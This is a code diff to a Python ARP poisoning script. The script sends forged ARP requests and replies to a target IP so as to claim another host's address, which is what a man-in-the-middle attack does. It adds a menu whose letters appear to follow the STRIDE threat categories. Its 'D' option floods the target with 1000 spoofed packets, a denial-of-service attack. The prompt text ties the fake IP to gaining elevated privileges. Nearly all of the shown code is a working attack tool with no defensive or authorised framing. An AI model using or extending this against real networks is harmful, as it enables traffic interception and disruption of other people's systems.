@@ -18,6 +18,12 @@ def send_ping(target):
 
 
 def send_arp_poison(target_ip, fake_ip, fake_mac, interval=2, count=10):
+    # Sending ARP request
+    print(f"Sending ARP Poison Request: {fake_ip} is at {fake_mac}")
+    arp_request = ARP(op=1, pdst=target_ip, psrc=fake_ip, hwsrc=fake_mac)
+    send(arp_request, verbose=False)
+
+    # actual poison (Spoof)
     print(f"Sending ARP Poison: {fake_ip} is at {fake_mac}")
     arp_packet = ARP(op=2, pdst=target_ip, psrc=fake_ip, hwsrc=fake_mac)
 
@@ -32,6 +38,19 @@ if __name__ == "__main__":
     target_ip = input("Enter target IP: ")
     send_ping(target_ip)
 
-    fake_ip = input("Enter fake IP: ")
+    fake_ip = input("Enter fake IP (DHCP Address for Elevated Privalges): ")
     fake_mac = input("Enter fake MAC: ")
-    send_arp_poison(target_ip, fake_ip, fake_mac)
+
+    switch = {
+        'S': lambda: send_arp_poison(target_ip, fake_ip, fake_mac),
+        'T': lambda: send_arp_poison(target_ip, fake_ip, fake_mac),
+        'R': lambda: send_arp_poison(target_ip, fake_ip, fake_mac),
+        'I': lambda: send_arp_poison(target_ip, fake_ip, fake_mac),
+        'D': lambda: send_arp_poison(target_ip, fake_ip, fake_mac, interval=0, count=1000),
+        'E': lambda: send_arp_poison(target_ip, fake_ip, fake_mac),
+    }
+
+    choice = input("Enter a letter (S, T, R, I, D, E): ").upper()
+
+    # Execute the corresponding function or print an error message
+    switch.get(choice, lambda: print("Invalid choice!"))()
